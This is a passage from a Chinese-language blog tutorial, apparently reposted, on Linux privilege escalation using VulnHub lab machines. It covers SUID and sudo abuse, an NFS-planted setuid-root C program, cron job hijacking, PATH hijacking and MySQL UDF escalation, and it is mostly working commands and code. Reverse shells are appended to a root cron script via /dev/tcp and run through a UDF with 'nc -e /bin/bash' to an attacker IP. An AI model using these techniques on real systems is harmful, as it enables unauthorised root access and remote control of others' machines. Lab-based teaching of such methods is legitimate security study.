+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">/usr/bin/find . -exec &#x27;whoami&#x27; \;                <br>root<br>root<br>root<br>root<br>root<br><br><br>###总的来说啊就是/bin/sh这个位置可以替换成命令<br>然后我们可以弹一个root权限的shell回来<br>也可以直接提权起一个root终端<br>#####<br></code></pre></td></tr></table></figure>
+
+<h3 id="使用命令进行探测"><a href="#使用命令进行探测" class="headerlink" title="使用命令进行探测"></a><strong>使用命令进行探测</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">命令：SUID GUID<br>find / -perm -u=s -type f 2&gt;/dev/null<br>find / -perm -g=s -type f 2&gt;/dev/null<br><br><br>find / -perm -g=s -type f 2&gt;/dev/null<br>/usr/bin/ssh-agent<br>/usr/bin/at<br>/usr/bin/mlocate<br>/usr/bin/lockfile<br>/usr/bin/chage<br>/usr/bin/bsd-write<br>/usr/bin/mutt_dotlock<br>/usr/bin/wall<br>/usr/bin/crontab<br>/usr/bin/expiry<br>/usr/bin/procmail<br>/usr/bin/dotlockfile<br>/usr/lib/utempter/utempter<br>/sbin/unix_chkpwd<br><br>还是建议用上面那个工具<br>简洁明了<br><br>#利用参考：<br>https://gtfobins.github.io/<br> <br></code></pre></td></tr></table></figure>
+
+<h2 id="sudo提权（普通用户权限使用）"><a href="#sudo提权（普通用户权限使用）" class="headerlink" title="sudo提权（普通用户权限使用）"></a><strong>sudo提权（普通用户权限使用）</strong></h2><p>环境：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/toppo-1,245/">https://www.vulnhub.com/entry/toppo-1,245/</a></p>
+<p>搭建：创建任意虚拟机，然后将toppo.vmdx文件改名并替换原来的vmdx文件</p>
+<h3 id="前情提要-2"><a href="#前情提要-2" class="headerlink" title="前情提要"></a><strong>前情提要</strong></h3><p>sudo提权其实和suid提权原理差不多</p>
+<p>我们安装工具的时候经常使用到sudo来执行脚本</p>
+<p>当我们使用这个sudo命令的时候就有可能造成安全问题</p>
+<p>总的来说就是其他用户调用一些命令的时候不会因为权限问题受限，root可以调用，web用户也可以调用</p>
+<h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a><strong>过程</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">SUDO:<br><br>cat /etc/sudoers<br><br>/usr/bin/awk &#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>这个提权就不过多阐述</p>
+<p>#利用参考：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
+<h2 id="总结SUDO-SUID"><a href="#总结SUDO-SUID" class="headerlink" title="总结SUDO&amp;SUID"></a><strong>总结SUDO&amp;SUID</strong></h2><p>#应用场景：</p>
+<p>获取到Web权限或普通用户在Linux服务器上时进行的SUID&amp;SUDO提权</p>
+<p>SUID (Set owner User ID up on execution)是给予文件的一个特殊类型的文件权限。在Linux&#x2F;Unix中，当一个程序运行的时候，程序将从登录用户处继承权限。SUID被定义为给予一个用户临时的（程序&#x2F;文件）所有者的权限来运行一个程序&#x2F;文件。用户在执行程序&#x2F;文件&#x2F;命令的时候，将获取文件所有者的权限以及所有者的UID和GID。</p>
+<p>SUDO权限是root把本来只能超级用户执行的命令赋予普通用户执行，系统管理员集中的管理用户使用权限和使用主机，配置文件：&#x2F;etc&#x2F;sudoers，除此配置之外的问题，SUDO还有两个CVE漏洞（CVE-2019-14287 CVE-2021-3156）。</p>
+<p>注意这个漏洞比较重要CVE-2021-3156</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">###sudo在这个版本可能有漏洞<br>sudo: 1.8.2 - 1.8.31p2<br>sudo: 1.9.0 - 1.9.5p1<br><br>###可以使用sudo -V查看<br><br>┌──(root㉿kali)-[~]<br>└─# sudo -V                    <br>Sudo 版本 1.9.10<br>当前选项：--build=x86_64-linux-gnu --prefix=/usr --includedir=$&#123;prefix&#125;/include --mandir=$&#123;prefix&#125;/share/man --infodir=$&#123;prefix&#125;/share/info --sysconfdir=/etc --localstatedir=/var --disable-option-checking --disable-silent-rules --libdir=$&#123;prefix&#125;/lib/x86_64-linux-gnu --runstatedir=/run --disable-maintainer-mode --disable-dependency-tracking --with-all-insults --with-pam --with-pam-login --with-fqdn --with-logging=syslog --with-logfac=authpriv --with-env-editor --with-editor=/usr/bin/editor --with-timeout=15 --with-password-timeout=0 --with-passprompt=[sudo] password for %p: --with-tty-tickets --without-lecture --disable-root-mailer --with-sendmail=/usr/sbin/sendmail --with-rundir=/run/sudo --with-sssd --with-sssd-lib=/usr/lib/x86_64-linux-gnu --enable-zlib=system --enable-admin-flag --with-selinux --with-linux-audit --enable-tmpfiles.d=/usr/lib/tmpfiles.d MVPROG=/bin/mv --with-exampledir=/usr/share/doc/sudo/examples<br>Sudoers 策略插件版本 1.9.10<br>Sudoers 文件语法版本 48<br> <br></code></pre></td></tr></table></figure>
+
+<p>这个没什么卵用CVE-2019-14287</p>
+<h2 id="利用NFS提权"><a href="#利用NFS提权" class="headerlink" title="利用NFS提权"></a><strong>利用NFS提权</strong></h2><h3 id="认识NFS"><a href="#认识NFS" class="headerlink" title="认识NFS"></a><strong>认识NFS</strong></h3><p>什么是NFS？</p>
+<p>网络文件系统（<strong>NFS</strong>）是一个客户端&#x2F;服务器应用程序，它使计算机用户可以查看和选择存储和更新远程计算机上的文件，就像它们位于用户自己的计算机上一样。在  <strong>NFS</strong>  协议是几个分布式文件系统标准，网络附加存储（NAS）之一。</p>
+<p>NFS是基于UDP&#x2F;IP协议的应用，其实现主要是采用远程过程调用RPC机制，RPC提供了一组与机器、操作系统以及低层传送协议无关的存取远程文件的操作。RPC采用了XDR的支持。XDR是一种与机器无关的数据描述编码的协议，他以独立与任意机器体系结构的格式对网上传送的数据进行编码和解码，支持在异构系统之间数据的传送。</p>
+<h3 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a><strong>过程</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">先扫靶机就不多说了<br>nmap 192.168.1.6<br><br>### NFS服务利用（连接NFS的命令）<br>showmount -e 192.168.1.6<br><br>###在本机kali创建共享的文件夹（小坑一个）<br>mkdir nfs<br><br>### 这是通过脚本来提权，你也可以上传带有suid的文件来提权<br><br><br><br><br>### 攻击机上执行<br><br>配合SUID提权<br>注意gcc编译机器与目标机内核版本相似<br>#include&lt;stdlib.h&gt;<br>#include&lt;unistd.h&gt;<br>int main()<br>&#123;<br>setuid(0);<br>system(&quot;id&quot;);<br>system(&quot;/bin/bash&quot;);<br>&#125;<br>gcc getroot.c -o getroot<br>cp getroot /root/nfs #复制bash到挂载目录下<br>chmod +s getroot   #赋予suid权限<br>chmod 777 getroot   #可读可写可执行权限<br><br>find / -perm -u=s -type f 2&gt;/dev/null 再看看是否加入suid文件<br>/usr/bin/ssh-agent<br>/usr/bin/at<br>/usr/bin/mlocate<br>/usr/bin/lockfile<br>/usr/bin/chage<br>/usr/bin/bsd-write<br>/usr/bin/mutt_dotlock<br>/usr/bin/wall<br>/usr/bin/crontab<br>/mnt/nfs/getroot   ####有了嘿嘿嘿<br><br><br><br>###靶机上执行<br>cd /mnt/nfs     # 目标机<br>./getroot       # 目标机<br><br><br> <br></code></pre></td></tr></table></figure>
+
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><p>NFS其实就相当于文件共享，在实战中遇到的很少<br>然后我们上传什么文件，他就继承什么权限<br>所以我们可以上传suid的find<br>给他root权限，然后我们就可以执行这个文件从而得到管理员的shell  </p>
+<p>###有一个小坑不同内核的Linux，不同版本的Linux上传上去的文件执行提权有可能会报错<br>解决方案：<br>1 找一个相似版本的文件<br>2 编译一个c语言的脚本来调用（如过程当中所展示）</p>
+<h2 id="Cron定时任务提权（不怎么好用）"><a href="#Cron定时任务提权（不怎么好用）" class="headerlink" title="Cron定时任务提权（不怎么好用）"></a><strong>Cron定时任务提权（不怎么好用）</strong></h2><h3 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a><strong>靶机</strong></h3><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/jarbas-1,232/">https://www.vulnhub.com/entry/jarbas-1,232/</a></p>
+<h3 id="前情提要-3"><a href="#前情提要-3" class="headerlink" title="前情提要"></a><strong>前情提要</strong></h3><p>定时任务（cron job）被用于安排那些需要被周期性执行的命令。利用它，你可以配置某些命令或者脚本，让它们在某个设定的时间内周期性地运行。cron 是 Linux 或者类 Unix 系统中最为实用的工具之一。cron 服务（守护进程）在系统后台运行，并且会持续地检查 &#x2F;etc&#x2F;crontab 文件和 &#x2F;etc&#x2F;cron.*&#x2F; 目录。它同样也会检查 &#x2F;var&#x2F;spool&#x2F;cron&#x2F; 目录。</p>
+<p>提升条件：Web或用户权限进行查看，任务文件可修改</p>
+<h3 id="过程-2"><a href="#过程-2" class="headerlink" title="过程"></a><strong>过程</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">###如何判断可以用哪些任务？<br>一般来说是在/etc/crontab<br>所以我们直接<br>cat /etc/crontab<br># /etc/crontab: system-wide crontab<br># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;<br># command to install the new version when you edit this file<br># and files in /etc/cron.d. These files also have username fields,<br># that none of the other crontabs do.<br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br># Example of job definition:<br># .---------------- minute (0 - 59)<br># | .------------- hour (0 - 23)<br># | | .---------- day of month (1 - 31)<br># | | | .------- month (1 - 12) OR jan,feb,mar,apr ...<br># | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat<br># | | | | |<br># * * * * * user-name command to be executed<br>17 *   * * *   root   cd / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6   * * *   root   test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6   * * 7   root   test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6   1 * *   root   test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )<br>#<br><br><br><br>###然后去修改这些定时任务加入反弹shell命令就可以直接提权了<br>注意要修改root用户启动的定时任务才能成功提权<br><br>实例<br>cat /etc/script/CleaningScript.sh   #查看脚本内容<br>ls -lia /etc/script/CleaningScript.sh #查看对任务文件的权限<br>echo &quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.139.141/66 0&gt;&amp;1&quot; &gt;&gt; /etc/script/CleaningScript.sh<br></code></pre></td></tr></table></figure>
+
+<h2 id="PATH变量提权"><a href="#PATH变量提权" class="headerlink" title="PATH变量提权"></a><strong>PATH变量提权</strong></h2><h3 id="前情提要-4"><a href="#前情提要-4" class="headerlink" title="前情提要"></a><strong>前情提要</strong></h3><p>PATH变量提权本质上和suid提权差不多，当suid提权的命令无法执行命令的时候，我们就要考虑PATH提权了，有部分运维人员为了方便会自己写脚本，而这些脚本会调用一些命令，众所周知Linux一切都是文件，命令也是调用文件，所以我们现在可以上传一个相同的命令文件，通过修改系统变量，让系统调用命令的时候调用我们的文件，然后我们在我们的文件中插入反弹shell命令，从而达到提权的目的</p>
+<p>注意还是和suid提权一样，注意原本文件的权限为root</p>
+<h3 id="过程-3"><a href="#过程-3" class="headerlink" title="过程"></a><strong>过程</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">###查找有权限的文件<br>find / -perm -u=s -type f 2&gt;/dev/null<br>/usr/bin/ssh-agent<br>/usr/bin/at<br>/usr/bin/mlocate<br>/usr/bin/lockfile<br>/usr/bin/chage<br>/opt/statuscheck<br><br>###看文件调用了什么命令<br>strings /opt/statuscheck<br>假如调用了curl命令<br><br>###到/tmp上传我们的curl，替换系统变量然后执行原本的文件<br>cd /tmp<br>echo &quot;/bin/sh&quot; &gt; curl<br>chmod 777 curl<br>export PATH=/tmp:$PATH   ###替换变量<br>echo $PATH       ###看看变量替换成功没<br>/opt/statuscheck     ####运行原本的脚本<br> <br></code></pre></td></tr></table></figure>
+
+<h2 id="数据库类型提权"><a href="#数据库类型提权" class="headerlink" title="数据库类型提权"></a><strong>数据库类型提权</strong></h2><h3 id="前情提要-5"><a href="#前情提要-5" class="headerlink" title="前情提要"></a><strong>前情提要</strong></h3><p>其实之前写过一篇数据库提权了，这里再细说一下<br>MSSQL MySQL Redis(linux特有) sqlserver（windows特有）</p>
+<h3 id="UDF提权过程"><a href="#UDF提权过程" class="headerlink" title="UDF提权过程"></a><strong>UDF提权过程</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">###之前写过了今天就不写那么细了<br><br><br>kali上有利用脚本搜索一下<br>┌──(root㉿kali)-[~]<br>└─# searchsploit udf      <br>------------------------------------------------------------------------------------------ ---------------------------------<br>Exploit Title                                                                           | Path<br>------------------------------------------------------------------------------------------ ---------------------------------<br>Cloudflare WARP 1.4 - Unquoted Service Path                                               | windows/local/50805.txt<br>DUdForum 3.0 - &#x27;iFor&#x27; SQL Injection                                                       | asp/webapps/5894.txt<br>FUDforum - Multiple Remote PHP Code Injection Vulnerabilities                             | php/webapps/38418.txt<br>FUDforum 3.0.6 - Cross-Site Scripting / Cross-Site Request Forgery                       | php/webapps/40802.txt<br>FUDforum 3.0.6 - Local File Inclusion                                                     | php/webapps/40803.txt<br>FUDForum 3.0.9 - Remote Code Execution                                                   | php/webapps/47650.txt<br>FUDForum 3.1.0 - &#x27;author&#x27; Reflected XSS                                                   | php/webapps/49943.txt<br>FUDForum 3.1.0 - &#x27;srch&#x27; Reflected XSS                                                     | php/webapps/49942.txt<br>Ilia Alshanetsky FUDForum 1.2.8/1.9.8/2.0.2 - File Disclosure                             | php/webapps/21723.txt<br>Ilia Alshanetsky FUDForum 1.2.8/1.9.8/2.0.2 - File Modification                           | php/webapps/21724.txt<br>MySQL 4.0.17 (Linux) - User-Defined Function (UDF) Dynamic Library (1)                   | linux/local/1181.c<br>MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)                   | linux/local/1518.c<br>MySQL 4/5/6 - UDF for Command Execution                                                   | linux/local/7856.txt<br>NCTsoft - &#x27;AudFile.dll&#x27; ActiveX Control Remote Buffer Overflow                           | windows/remote/6175.html<br>PostgreSQL 8.2/8.3/8.4 - UDF for Command Execution                                       | linux/local/7855.txt<br>RedHat CloudForms Management Engine 5.1 - agent/linuxpkgs Directory Traversal (Metasploit | linux/remote/30469.rb<br>------------------------------------------------------------------------------------------ ---------------------------------<br><br><br><br><br>###找一下脚本位置<br>┌──(root㉿kali)-[~]<br>└─# find / -name 1518.c<br>/usr/share/exploitdb/exploits/linux/local/1518.c<br><br>###自己保存到桌面上编译一下（这不多说）<br>cp /usr/share/exploitdb/exploits/linux/local/1518.c /home/kali/桌面<br><br>gcc -g -shared -Wl,-soname,1518.so -o udf.so 1518.c -lc<br><br><br>###上传这个文件到靶机<br><br>-连接进行导出调用<br>mysql -uroot -pR@v3nSecurity<br>select version();   #查看mysql版本<br>select @@basedir;   #确认mysql安装位置<br>show variables like &#x27;%basedir%&#x27;;   #确认mysql安装位置<br>show variables like &#x27;%secure%&#x27;; #查看可导出文件位置<br>show variables like &#x27;%plugin%&#x27;;   #查找插件位置<br>show variables like &#x27;%compile%&#x27;;   #查看系统版本<br>use mysql;<br><br># 创建mkbk表<br>create table xiaodi(line blob);<br><br># 往mkbk表中插入二进制的udf.so<br>insert into xiaodi values(load_file(&#x27;/tmp/udf.so&#x27;));<br><br># 导出udf.so<br>select * from xiaodi into dumpfile &#x27;/usr/lib/mysql/plugin/udf.so&#x27;•;<br><br># 创建do_system自定义函数<br>create function do_system returns integer soname &#x27;udf.so&#x27;;<br>select do_system(&#x27;nc 192.168.139.141 6666 -e /bin/bash&#x27;);<br><br><br><br>能外联直接用工具，别自己搞太难受了<br></code></pre></td></tr></table></figure>
+
+<p>原文转自：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/FpFqyAUUR8A882WWVWPCxg">水刃安全</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BD%91%E5%AE%89/" class="category-chain-item">网安</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/" class="category-chain-item">内网横向</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%8F%90%E6%9D%83/" class="print-no-link">#提权</a>
+      
+    </div>
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/" title="一文就学会网络钓鱼“骚”姿势">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">一文就学会网络钓鱼“骚”姿势</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/06/12/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/" title="数据库提权">
+                        <span class="hidden-mobile">数据库提权</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
